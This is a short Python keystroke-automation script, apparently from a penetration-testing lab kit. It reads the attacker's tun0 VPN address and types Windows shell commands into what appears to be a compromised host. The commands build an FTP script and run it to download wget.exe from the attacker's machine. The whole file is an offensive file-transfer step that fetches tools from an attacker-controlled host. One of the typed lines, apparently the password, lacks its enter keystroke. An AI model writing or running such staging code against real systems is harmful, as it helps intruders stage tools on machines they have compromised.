import netifaces as ni


try:
  ni.ifaddresses('tun0')
  tun_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

except ValueError:
  dialog.info_dialog('tun0 not found', 'Can not obtain tun0 IP. Is the device connected?')

else:
    #Enter script code
    keyboard.send_keys("echo open "+ tun_ip+ ">ftp.txt")
    keyboard.send_keys("<enter>")
    keyboard.send_keys("echo USER offset>>ftp.txt")
    keyboard.send_keys("<enter>")
    keyboard.send_keys("echo transfer>>ftp.txt")
    keyboard.send_keys("echo bin>>ftp.txt")
    keyboard.send_keys("<enter>")
    keyboard.send_keys("echo GET wget.exe>>ftp.txt")
    keyboard.send_keys("<enter>")
    keyboard.send_keys("echo bye>>ftp.txt")
    keyboard.send_keys("<enter>")
    keyboard.send_keys("ftp -n -v -s:ftp.txt")
    keyboard.send_keys("<enter>")
    